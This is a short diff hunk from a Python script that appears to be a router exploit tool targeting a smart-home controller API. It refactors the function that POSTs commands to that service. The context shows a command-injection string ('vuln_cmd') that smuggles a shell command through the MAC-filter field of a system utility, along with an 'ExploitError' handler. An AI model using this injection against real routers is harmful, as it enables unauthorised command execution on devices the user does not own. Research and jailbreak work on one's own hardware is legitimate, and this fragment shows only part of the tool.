@@ -69,16 +69,16 @@ vuln_cmd = "/usr/sbin/sysapi macfilter set mac=;; wan=no;/usr/sbin/sysapi macfil
 max_cmd_len = 100 - 1 - len(vuln_cmd)
 hackCheck = False
 
-def exec_smart_cmd(cmd, timeout = 7):
-    api = 'xqsmarthome/request_smartcontroller'
+def exec_smart_cmd(cmd, timeout = 7, api = 'API/xqsmarthome/request_smartcontroller'):
     sc_command = cmd['command']
     payload = json.dumps(cmd, separators = (',', ':'))
     try:
-        res = requests.post(gw.apiurl + api, data = { "payload": payload }, timeout = timeout)
+        data = { "payload": payload }
+        res = gw.api_request(api, data, resp = 'text', post = 'x-www-form', timeout = timeout)
     except Exception as e:
         msg = getattr(e, 'message', str(e))
         raise ExploitError(f'Cannot send POST-request "{sc_command}" to SmartController service. {msg}')
-    return res.text
+    return res
 
 def exec_smart_command(cmd, timeout = 7, ignore_err_code = 0):
     res = exec_smart_cmd( { "command": cmd } , timeout = timeout)
